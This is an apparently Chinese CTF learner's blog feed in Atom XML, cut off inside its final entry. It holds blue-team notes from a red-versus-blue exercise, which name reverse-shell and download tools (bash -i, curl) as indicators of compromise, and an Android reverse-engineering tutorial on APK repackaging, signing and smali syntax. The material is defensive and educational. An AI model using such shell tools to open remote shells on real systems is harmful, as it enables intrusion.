<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>能打一辈子CTF吗？</title>
  <icon>https://www.gravatar.com/avatar/260de78781b3355b5fcbb52d09a7a2a9</icon>
  <subtitle>呜呜什么时候能成为厉害的会二进制的大人啊</subtitle>
  <link href="https://github.com/xyy9233/xyy9233.github.io.git/atom.xml" rel="self"/>
  
  <link href="https://github.com/xyy9233/xyy9233.github.io.git/"/>
  <updated>2024-03-12T01:10:02.220Z</updated>
  <id>https://github.com/xyy9233/xyy9233.github.io.git/</id>
  
  <author>
    <name>wind_9233</name>
    <email>1768765226@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/11/%E6%97%81%E5%90%AC%E5%90%AC/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/11/%E6%97%81%E5%90%AC%E5%90%AC/</id>
    <published>2024-03-11T09:57:49.905Z</published>
    <updated>2024-03-12T01:10:02.220Z</updated>
    
    <content type="html"><![CDATA[<h2 id="听听国护"><a href="#听听国护" class="headerlink" title="听听国护#"></a>听听国护#</h2><p>处置组：</p><p>WAF 全流量设备 态势感知</p><p>！？好酷</p><p>监控组：</p><ul><li><p>360：天擎 天眼 </p></li><li><p>深信服：WAF</p></li><li><p>青藤：万相（图1） + THP &#x2F;&#x2F;独特语法(sql<br>看横向（包全</p></li><li><p>微步之类的信息社区实时好啊</p></li><li><p>卫士通：全流量设备（轻量级（包不算全</p></li><li><p>科来（流量全，敏感</p></li><li><p>天融信</p></li><li><p>腾讯：通信安全</p></li><li><p>飞书：传输安全</p></li><li><p>绿盟：IDS（可视化中央集成平台</p></li></ul><p>研判组：</p><ul><li><p>应急处置（被打反应（隔离下线（15min内结束</p></li><li><p>机器内外网防备，隔离处置下线（欸嘿…</p></li><li><p>落地文件）（好家伙）删+分析</p><ul><li>exe沙箱，pwn处理（呜呜终于有逆向了</li><li>处理进程，bin bash,curl,ssh……进程马之类的</li><li>看怎么打进来的，用什么冻，然后用了什么进来的。# 朔源（攻击、分析、跳板（思考模拟（个人习惯（</li></ul><p>#360quake  攻击者画像  #跳板机x</p></li><li><p>盲注）</p></li><li><p>DNS分析、接口泄漏、github之类的</p><p>处置组：</p></li><li><p>阅读核心日志</p></li><li><p>pwn自己的机器</p></li><li><p>#神奇的t00ls、微步…</p></li><li><p>一些社工手段</p></li></ul><p>蓝方：</p><p>布防  资产</p><p>确认防守方</p><p>下线非正式系统</p><p>vpn</p><p>钓鱼邮件（x</p><p>java降权、oi降权、权限</p><ul><li>卫士通、天眼搭配</li><li>青藤 X 360</li></ul><p>监控摄像不能要（ x 监控组的东西</p><p>THP（内网告警（是否横向？（IP、流量、感知–落地马</p><p>查所有特权账号</p><p>0day（ orz（ 收集0day</p><p>读日志，access_log，bash_history（可疑进程和账号</p><p>java内存马—-bash -i、curl</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;听听国护&quot;&gt;&lt;a href=&quot;#听听国护&quot; class=&quot;headerlink&quot; title=&quot;听听国护#&quot;&gt;&lt;/a&gt;听听国护#&lt;/h2&gt;&lt;p&gt;处置组：&lt;/p&gt;
&lt;p&gt;WAF 全流量设备 态势感知&lt;/p&gt;
&lt;p&gt;！？好酷&lt;/p&gt;
&lt;p&gt;监控组：&lt;/p&gt;
&lt;ul&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/07/Android%E9%80%86%E5%90%91/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/07/Android%E9%80%86%E5%90%91/</id>
    <published>2024-03-07T03:23:17.289Z</published>
    <updated>2024-03-12T14:30:16.263Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android逆向"><a href="#Android逆向" class="headerlink" title="Android逆向"></a>Android逆向</h1><h2 id="Android基础知识"><a href="#Android基础知识" class="headerlink" title="Android基础知识"></a>Android基础知识</h2><h3 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h3><p>安卓（Android）是一种基于Linux内核（不包含GNU组件）的自由及开放源代码的操作系统。主要使用于移动设备，如智能手机和平板电脑，由美国Google公司和开放手机联盟领导及开发。</p><p>android框架：<img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240307112450236.png" alt="image-20240307112450236"></p><p> 从下往上分别是：Linux内核层、系统运行库层（程序库+android运行库）、应用程序框架层、应用层。</p><p><strong>Linux内核层：</strong> Android 系统是基于 Linux 内核的,它提供了基本的系统功能及与硬件交互的驱动，像图中Display Driver（显示驱动）、Camera Driver（摄像头驱动）、WiFi Driver（WiFi驱动）等</p><p><strong>系统运行库层：</strong> 像图中内核的上一层就是系统运行库层，程序库（绿色部分） 和 Android运行库（黄色部分） 组成。</p><ul><li><p>Libraries（程序库）： 由 C、C++ 编写，一系列程序库的集合，供 Android 系统的各个组件使用。</p></li><li><p>Android runtime（Core Librares + Dalvik虚拟机）： 翻译过来就是 Android 运行时，Android 应用程序时采用 Java 语言编写，程序在Android运行时中执行，其运行时分为核心库 和 Dalvik虚拟机 两部分。</p></li></ul><p><strong>Application Framework（应用程序框架层）</strong>： 这一层主要是提供一些组件，搭建框架，方便app 开发人用再次基础上快速开发开发应用程序。而实际上就是一些 Android API。</p><p><strong>Applications（应用层</strong>）：顶层中有所有的 Android 应用程序，如手机中的：电话、文件管理、信息等。</p><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a><strong>虚拟机</strong></h3><h4 id="Dalvik-虚拟机"><a href="#Dalvik-虚拟机" class="headerlink" title="Dalvik 虚拟机"></a><strong>Dalvik</strong> <strong>虚拟机</strong></h4><p>Dalvik 是 google 专门为 Android 操作系统设计的一个虚拟机，简称DVM<strong>。</strong>在 Android 4.4及以前的版本， 所有的 Android 程序都是在 Dalvik 虚拟机环境下去运行的。DVM 的指令是<strong>基于寄存器</strong>的，运行的是经过转换的 <strong>.dex****文件</strong> （.dex 是专为 Dalvik 设计的一种压缩格式，适合内存和处理器速度有限的系统），Dalvik 虚拟机每次应用运行的时候，将代码编译成机器语言执行。</p><h4 id="ART-虚拟机"><a href="#ART-虚拟机" class="headerlink" title="ART 虚拟机"></a><strong>ART</strong> <strong>虚拟机</strong></h4><p>前面说到，当我们使用手机每运行一个程序，Dalvik 虚拟机都会产生一个实例，互不影响，这就可能会出现占用资源过多等问题，随着人们日益增长的需求，Dalvik 无法满足人们对软件运行效率的需要。这是就诞生了 ART 虚拟机。</p><p>在 <strong>Android4.4</strong> <strong>及以上版本</strong>，应运而生的 ART 虚拟机替代了 Dalvik 虚拟机，其处理机制根本上的区别是它采用AOT(Ahead of TIme) 技术，<strong>会在应用程序安装时就转换成机器语言，不再在执行时解释</strong>，从而优化了应用运行的速度。在内存管理方面，ART 也有比较大的改进，对内存分配和回收都做了算法优化，降低了内存碎片化程度，回收时间也得以缩短。</p><p><strong>DVM</strong> <strong>与</strong> <strong>ART</strong> <strong>的区别：</strong> 虽说 ART 替换了 Dalvik 虚拟机，并不意味着，其应用程序开发上也要发生改变，像 android 应用程序安装包（apk）中，仍然还是可执行的 .dex 文件。</p><h3 id="Apk-编译流程"><a href="#Apk-编译流程" class="headerlink" title="Apk 编译流程"></a><strong>Apk</strong> <strong>编译流程</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240307124845628.png" alt="image-20240307124845628"></p><h3 id="正向开发"><a href="#正向开发" class="headerlink" title="正向开发"></a><strong>正向开发</strong></h3><p>首先我们来写一个 app，并打包成 apk。在这个过程中，我们可以接触到很多安卓逆向中会遇到的概</p><p>念。</p><p>一个 app 可以理解为由三个基本元件构成：</p><ol><li><p>AndroidManifest.xml：可以想成是 app 的配置文件</p></li><li><p>resources：各种资源，包括排版、代码中出现的字符串、图片等</p></li><li><p>代码：UI 界面及逻辑代码</p></li></ol><p>下面是一个简单的 demo，左边是项目树，右边是 AndroidManifest.xml 的內容：</p><p>从这个配置文件，我们可以知道：</p><ol><li><p>这个 app 的包名（package name）是 com.example.demo</p></li><li><p>这个 app 里有一个窗体（activity），名字为 MainActivity ，是程序入口窗体</p></li></ol><p>什么是 activity 呢？你可以把 activity 理解成是一个界面，每个程序界面对应一个 activity。假设 app是个需要注册才能使用的应用，则可能有以下界面：</p><ul><li><p>欢迎界面</p></li><li><p>注册界面</p></li><li><p>登录界面</p></li><li><p>主界面</p></li></ul><p>而这每一个界面都是一个 activity，而每一个 activity 可能都有一个 layout。在 Android 开发中，layout 其实就是一个 xml 文档，像这样：</p><p>像 layout 就属于资源文件的一种，会被放到 res 文件夹下。</p><p>上图中有两点需要注意，一是 android:id&#x3D;”@+id&#x2F;textview_first” 代表这个组件对应到一个 id。才能在代码里通过 id 拿到这个组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TextView tv = (TextView) findViewById(R.id.textview_first);</span><br><span class="line"></span><br><span class="line">tv.setText(&quot;hello&quot;);</span><br></pre></td></tr></table></figure><p>第二个值得注意的地方是 android:text&#x3D;”@string&#x2F;hello_first_fragment” ，这其实就是组件会显示的文字，对应到 res&#x2F;values&#x2F;strings.xml ：</p><p>利用这样的方法，我们可以避免直接在 layout 里写死字符串，这样就可以做成支持多国语言的 app。</p><p><strong>拆包与重打包</strong></p><p>上面的程序编译成 apk 后，我们可以把它的后缀改成 .zip 直接解压，得到这样的目录结构：</p><ul><li><p>META-INF：存放签名文件</p></li><li><p>res：资源文件</p></li><li><p>AndroidManifest.xml：app 配置文件</p></li><li><p>classes.dex：Java 代码编译成 dex 文件</p></li><li><p>resources.arsc：资源文件相关的索引表</p></li></ul><p>java -jar apktool.jar d -f demo.apk</p><p>修改 res&#x2F;values&#x2F;strings.xml 里的 hello_first_fragment 为 Hacked ，再重打包：</p><p>java -jar apktool.jar b –use-aapt2 demo -o demo2.apk</p><p>此时的 apk 还无法安装，我们需要对它进行 align 和 sign 才能在手机上安装：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">zipalign -v -p <span class="number">4</span> demo2.apk demo2-aligned.apk</span><br><span class="line"></span><br><span class="line">keytool -genkey -v -keystore my-key.jks -keyalg RSA -keysize <span class="number">2048</span> -validity</span><br><span class="line"><span class="number">10000</span> -alias my-alias</span><br><span class="line"></span><br><span class="line">apksigner sign --ks my-key.jks --ks-pass pass:<span class="number">123456</span> --out demo2-signed.apk</span><br><span class="line">demo2-aligned.apk</span><br></pre></td></tr></table></figure><h3 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h3><p>JNI（Java Native Interface）是一种在 Java 虚拟机中调用本地（Native）方法的机制。在 Android中，由于 Android 应用是通过 Java 语言编写的，但是某些操作系统底层的功能只能通过本地 C&#x2F;C++ 代码来实现，所以需要使用 JNI 来实现Java与本地代码的交互。</p><p>使用 JNI 可以让 Java 程序调用本地库中的函数，而本地函数可以使用标准 C&#x2F;C++ 编写。这样可以通过JNI 将 Java 程序与本地代码组合在一起。</p><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a><strong>常用工具</strong></h3><ul><li><p>adb</p></li><li><p>apksigner</p></li><li><p>Android killer</p></li><li><p>jadx</p></li><li><p>jeb</p></li></ul><h2 id="smali语法"><a href="#smali语法" class="headerlink" title="smali语法"></a>smali语法</h2><h3 id="Java-gt-smali"><a href="#Java-gt-smali" class="headerlink" title="Java -&gt; smali"></a><strong>Java -&gt; smali</strong></h3><p>smali 文件是怎么得到的呢？</p><ol><li><p>通过 javac 把 .java 编译成 .class</p></li><li><p>通过 dx 把 .class 转化为 .dex</p></li><li><p>通过 baksmali 把 .dex 转为 smali</p></li></ol><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac Test.java</span><br><span class="line">dx --dex --output=Test.dex Test.class</span><br><span class="line">java -jar baksmali.jar d Test.dex</span><br></pre></td></tr></table></figure><h3 id="Dalvik-寄存器"><a href="#Dalvik-寄存器" class="headerlink" title="Dalvik 寄存器"></a><strong>Dalvik</strong> <strong>寄存器</strong></h3><p>Dalvik中 的寄存器都是 32 位大小，支持所有类型。对于小于或等于 32 位类型，使用一个寄存器就可</p><p>以了，对 64 位（long 和 double) 类型，需要使用两个相邻的寄存器来存储。</p><p><strong>寄存器的命名法有两种：****V</strong> <strong>命名法和</strong> <strong>P</strong> <strong>命名法：</strong></p><p> v 命名法：局部变量寄存器 V0-Vn，参数寄存器是 Vn-V(n+m)。</p><p> p 命名法：参数寄存器 P0-Pn，变量寄存器 V0-Vn。</p><h4 id="v-命名法"><a href="#v-命名法" class="headerlink" title="v 命名法"></a><strong>v</strong> <strong>命名法</strong></h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308224545382.png" alt="image-20240308224545382"></p><p>v0-v2 表示的是局部变量寄存器，v3-v4 表示的参数寄存器。在例一中第一个方框里可以看到 v2 是局部寄存器， v3 是参数寄存器。在图中第二个方框里可以看到 v0 是局部寄存器，v4 是参数寄存器。</p><h4 id="p-命名法"><a href="#p-命名法" class="headerlink" title="p 命名法"></a><strong>p</strong> <strong>命名法</strong></h4><p>p 命名法针对参数寄存器进行了优化，参数寄存器的命名从 p0 开始，使得局部变量寄存器和参数寄存器得以很容易的进行区分。smali 语法中就是用了 p 命名法。我们来看下 add() 方法的 smali 代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.method <span class="keyword">public</span> <span class="title function_">add</span><span class="params">(II)</span>I</span><br><span class="line">.registers <span class="number">4</span></span><br><span class="line">.param p1, <span class="string">&quot;a&quot;</span> # I</span><br><span class="line">.param p2, <span class="string">&quot;b&quot;</span> # I</span><br><span class="line">.prologue</span><br><span class="line">.line <span class="number">6</span></span><br><span class="line">add-<span class="type">int</span> v0, p1, p2</span><br><span class="line">.line <span class="number">7</span></span><br><span class="line">.local v0, <span class="string">&quot;c&quot;</span>:I</span><br><span class="line"><span class="keyword">return</span> v0</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>这样就很清晰了，4 个寄存器命名如下所示：</p><ul><li><p>v0 局部变量寄存器，存储 a+b 的值</p></li><li><p>p0 当前引用 this</p></li><li><p>p1 参数寄存器，存储 a 的值</p></li><li><p>p2 参数寄存器，存储 b 的值</p></li></ul><h3 id="Dalvik-描述符"><a href="#Dalvik-描述符" class="headerlink" title="Dalvik 描述符"></a><strong>Dalvik</strong> <strong>描述符</strong></h3><p>在更深入的了解 Dalvik 字节码前，先来看一下 Dalvik 是如何描述字段和方法的，这也有助于我们阅读smali 代码。</p><h4 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a><strong>类型描述符</strong></h4><p>Dalvik 字节码中只有两种类型，基本类型和引用类型。除了对象和数组以外，其他的所有 Java 类型都是基本类型。这和 JVM 的类型描述符是基本一致的。基本类型都是使用单个字母来表示。数组类型使用[ 表示。除数组以外的引用类型使用 L 加上全限定名表示。如下表所示：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308224712573.png" alt="image-20240308224712573"></p><p>举一个引用类型的例子。例如 String 对象，其全限定名是 java&#x2F;lang&#x2F;String; ，在 Dalvik 中就表示为 Ljava&#x2F;lang&#x2F;String; 。对于数组，又可以分为基本类型数组和引用类型数组，其格式都是 [ 加上类型描述符。 int[] 就是 [I ， String[] 就是 [java&#x2F;lang&#x2F;String; 。多维数组就是多个 [ ，例如int[][] 就是 [[I 。</p><h4 id="字段"><a href="#字段" class="headerlink" title="字段"></a><strong>字段</strong></h4><p>Dalvik 表示字段的格式：<strong>类型（包名＋类名）＋字段名称＋字段类型</strong></p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String;</span><br></pre></td></tr></table></figure><p>Lpackage&#x2F;name&#x2F;ObjectName; 是当前这个字段所在的类，其中，L 是 java类类型， package&#x2F;name&#x2F;是包名， ObjectName 是类名。</p><p>FieldName 是字段名称， Ljava&#x2F;lang&#x2F;String; 是字段类型。字段名称和字段类型之间要用 : 隔</p><p>开。</p><p>其他例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Landroid/content/pm/ActivityInfo;-&gt;theme:I</span><br><span class="line">Lorg/cocos2dx/lua/AppActivity;-&gt;handler:Landroid/os/Handler;</span><br></pre></td></tr></table></figure><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a><strong>方法</strong></h4><p>Dalvik 方法的表现形式：<strong>类型（包名＋类名）＋方法名（＋参数类型）＋返回值类型</strong></p><p>例如：Lpackage&#x2F;name&#x2F;ObjectName;-&gt;MethodName (III) Z</p><p>MethodName 是方法名， (III) Z 是方法的签名信息，由方法参数列表(III)和返回值(Z)构成，(III)表示三个 int 型参数；Z 表示返回值类型为 boolean。</p><p>其他例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Lcom/test/Test;-&gt;add(II)I</span><br><span class="line">Landroid/os/Handler;-&gt;&lt;init&gt;()V</span><br><span class="line">Landroid/app/Activity;-&gt;onCreate(Landroid/os/Bundle;)V</span><br></pre></td></tr></table></figure><h3 id="Dalvik-指令集"><a href="#Dalvik-指令集" class="headerlink" title="Dalvik 指令集"></a><strong>Dalvik</strong> <strong>指令集</strong></h3><p>参考资料：Dalvik opcodes</p><p>有了上面的知识储备之后，就可以具体的学习 Dalvik 指令集了。</p><p>Dalvik 指令格式为：<strong>基础字节码</strong> <strong>-</strong> <strong>名称后缀</strong>**&#x2F;**<strong>字节码后缀 目的寄存器 源寄存器</strong></p><p>注：连接符号 - 在有的指令里是可以不存在的</p><p>例子：<strong>move-wide&#x2F;from16 vAA,VBBBB</strong></p><p><strong>move</strong> <strong>为基础字节码</strong>：即 opcode。</p><p><strong>wide</strong> <strong>为名称后缀</strong>：标识指令操作的数据宽度为 64 位。</p><p><strong>from16</strong> <strong>为字节码后缀</strong>：标识源为一个 16 位的寄存器引用变量。</p><p><strong>vAA</strong> <strong>为目的寄存器</strong>：它始终在源的前面，取值范围为 v0~v255。</p><p><strong>vBBBB</strong> <strong>为源寄存器</strong>：取值范围为 v0~v65535。</p><p>Dalvik 指令集中大多数指令用到了寄存器作为目的操作数或源操作数，其中 A&#x2F;B&#x2F;C&#x2F;D&#x2F;E&#x2F;F&#x2F;G&#x2F;H 代表一个 4 位的数值，AA&#x2F;BB&#x2F;…&#x2F;HH 代表一个 8 位的数值，AAAA&#x2F;BBBB&#x2F;…&#x2F;HHHH 代表一个 16 位的数值。</p><p>一些常见的指令。</p><h4 id="空指令"><a href="#空指令" class="headerlink" title="空指令"></a><strong>空指令</strong></h4><p>nop     空指令，通常用于对齐</p><h4 id="数据操作指令"><a href="#数据操作指令" class="headerlink" title="数据操作指令"></a><strong>数据操作指令</strong></h4><p>数据操作指令为 move。move 指令根据字节码大小与类型不同，后面会跟上不同的后缀，表达的意义也就不同。</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225456588.png" alt="image-20240308225456588"></p><p>总结起来 move 指令有三种作用：</p><ul><li><p>进行赋值操作</p></li><li><p>move-result 接收返回值操作</p></li><li><p>处理异常的操作</p></li></ul><h4 id="返回指令"><a href="#返回指令" class="headerlink" title="返回指令"></a><strong>返回指令</strong></h4><p>返回指令即 return 指令，指的是函数结尾时运行的最后一条指令。共有以下四条返回指令：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225608978.png" alt="image-20240308225608978"></p><h4 id="数据定义指令"><a href="#数据定义指令" class="headerlink" title="数据定义指令"></a><strong>数据定义指令</strong></h4><p>数据定义指令用来定义程序中用到的常量，字符串，类等数据。它的基础字节码为 const</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225624563.png" alt="image-20240308225624563"></p><h4 id="类型判断指令"><a href="#类型判断指令" class="headerlink" title="类型判断指令"></a><strong>类型判断指令</strong></h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225636083.png" alt="image-20240308225636083"></p><h4 id="数组操作指令"><a href="#数组操作指令" class="headerlink" title="数组操作指令"></a><strong>数组操作指令</strong></h4><p>数组操作包括获取数组长度，新建数组，数组赋值，数组元素取值与赋值等操作。</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225648985.png" alt="image-20240308225648985"></p><p><strong>异常指令</strong></p><p>Dalvik 指令集有一条指令用来抛出异常：</p><p>throw vAA  抛出 vAA 寄存器指定的异常</p><h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a><strong>跳转指令</strong></h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225717003.png" alt="image-20240308225717003"></p><h4 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a><strong>比较指令</strong></h4><p>比较指令用于对两个寄存器的值（浮点型或长整型）进行比较。</p><ul><li><p>大于(1)&#x2F;等于(0)&#x2F;小于(-1)&#x3D;&gt;cmpg、cmp</p></li><li><p>大于(-1)&#x2F;等于(0)&#x2F;小于(1)&#x3D;&gt;cmpl</p></li></ul><p>指令如下：</p><ul><li><p><strong>cmp-long vAA, vBB, vCC</strong> <strong>：</strong>比较两个长整型数。如果vBB寄存器大于vCC寄存器，则结果为1，相等则结果为0，小于则结果为-1。</p></li><li><p><strong>cmpl-float vAA, vBB, vCC****：</strong>比较两个单精度浮点数。如果vBB寄存器大于vCC寄存器，结果为-1，相等则结果为0，小于的话结果为1。</p></li><li><p><strong>cmpl-double vAA, vBB, vCC****：</strong>比较两个双精度浮点数。如果vBB寄存器大于vCC寄存器，结果为-1，相等则结果为0，小于的话结果为1。</p></li><li><p><strong>cmpg-float vAA, vBB, vCC****：</strong>比较两个单精度浮点数。如果vBB寄存器大于vCC寄存器，结果为1，相等则结果为0，小于的话结果为-1。</p></li><li><p><strong>cmpg-double vAA, vBB, vCC****：</strong>比较两个双精度浮点数。如果vBB寄存器大于vCC寄存器，结果为1，相等则结果为0，小于的话结果为-1。</p></li></ul><h4 id="字段操作指令"><a href="#字段操作指令" class="headerlink" title="字段操作指令"></a><strong>字段操作指令</strong></h4><p>字段操作指令用来对对象实例的字段进入读写操作。字段的类型可以是 Java 中有效的数据类型，对普</p><p>通字段与静态字段操作有两中指令集。</p><ul><li><p>普通字段 &#x3D;&gt; iget读 &#x2F; iput 写</p></li><li><p>静态字段 &#x3D;&gt; sget读 &#x2F; sput 写</p></li></ul><h5 id="普通字段"><a href="#普通字段" class="headerlink" title="普通字段"></a><strong>普通字段</strong></h5><p>iinstanceop vA, vB,field@CCCC</p><p>对已标识的字段执行已确定的对象实例字段运算，并将结果加载或存储到值寄存器中</p><p>针对不同类型的普通字段，有如下指令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iget、iget-wide、iget-object、iget-<span class="type">boolean</span>、iget-<span class="type">byte</span>、iget-<span class="type">char</span>、iget-<span class="type">short</span></span><br><span class="line">iput、iput-wide、iput-object、iput-<span class="type">boolean</span>、iput-<span class="type">byte</span>、iput-<span class="type">char</span>、iput-<span class="type">short</span></span><br></pre></td></tr></table></figure><h5 id="静态字段"><a href="#静态字段" class="headerlink" title="静态字段"></a><strong>静态字段</strong></h5><p>sstaticop vAA,field@BBBB</p><p>对已标识的静态字段执行已确定的对象静态字段运算，并将结果加载或存储到值寄存器中</p><p>针对不同类型的静态字段，有如下指令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sget、sget-wide、sget-object、sget-<span class="type">boolean</span>、sget-<span class="type">byte</span>、sget-<span class="type">char</span>、sget-<span class="type">short</span></span><br><span class="line">sput、sput-wide、sput-object、sput-<span class="type">boolean</span>、sput-<span class="type">byte</span>、sput-<span class="type">char</span>、sput-<span class="type">short</span></span><br></pre></td></tr></table></figure><h4 id="方法调用指令"><a href="#方法调用指令" class="headerlink" title="方法调用指令"></a><strong>方法调用指令</strong></h4><p>方法调用指令的格式为 invoke-kind {vC, vD, vE, vF, vG}, meth@BBBB , 具体的有如下指令：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225931362.png" alt="image-20240308225931362"></p><p><strong>数据转换指令</strong></p><p>数据转换指令用于将一种类型的数值转换成另一种类型。它的格式为“opcode vA, vB”，vB寄存器存放需</p><p>要转换的数据，转换后的结果保存在vA寄存器中。</p><p>常见的数据转换指令：</p><ul><li><p>**neg-**<strong>数据类型</strong>：求补</p></li><li><p>**not-**<strong>数据类型</strong>：求反</p></li><li><p>*<em>数据类型</em>***1-to-<strong><strong>数据类型</strong></strong>2**：将数据类型1转换为数据类型2</p></li></ul><h4 id="数据运算指令"><a href="#数据运算指令" class="headerlink" title="数据运算指令"></a><strong>数据运算指令</strong></h4><p>数据运算指令包括算术运算指令与逻辑运算指令。算术运算指令主要进行数值间如加、减、乘、除、</p><p>模、移位等运算，逻辑运算主要进行数值间与、或、非、异或等运算。</p><p>常见的数据运算指令：</p><ul><li><p><strong>add&#x2F;sub&#x2F;mul&#x2F;div&#x2F;rem</strong>：加&#x2F;减&#x2F;乘&#x2F;除&#x2F;模</p></li><li><p><strong>and&#x2F;or&#x2F;xor</strong>：与&#x2F;或&#x2F;异或</p></li><li><p><strong>shl&#x2F;shr&#x2F;ushr</strong>：有符号左移&#x2F;有符号右移&#x2F;无符号右移</p></li></ul><h3 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a><strong>示例分析</strong></h3><p>通过<strong>演示</strong>，让我们来看看下面的这个 Java 程序在 smali 层面是怎样实现的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HELLO_WORLD</span> <span class="operator">=</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">System.out.println(HELLO_WORLD);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Android逆向&quot;&gt;&lt;a href=&quot;#Android逆向&quot; class=&quot;headerlink&quot; title=&quot;Android逆向&quot;&gt;&lt;/a&gt;Android逆向&lt;/h1&gt;&lt;h2 id=&quot;Android基础知识&quot;&gt;&lt;a href=&quot;#Android基础知识&quot; c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/04/C++%E9%80%86%E5%90%91/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/04/C++%E9%80%86%E5%90%91/</id>
    <published>2024-03-04T11:48:23.243Z</published>
    <updated>2024-03-04T13:58:46.535Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/02/%E7%AD%89%E5%BC%8F%E9%97%AE%E9%A2%98%E5%92%8CZ3%E4%BD%BF%E7%94%A8/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/02/%E7%AD%89%E5%BC%8F%E9%97%AE%E9%A2%98%E5%92%8CZ3%E4%BD%BF%E7%94%A8/</id>
    <published>2024-03-02T08:51:00.191Z</published>
    <updated>2024-03-02T11:05:39.403Z</updated>
    
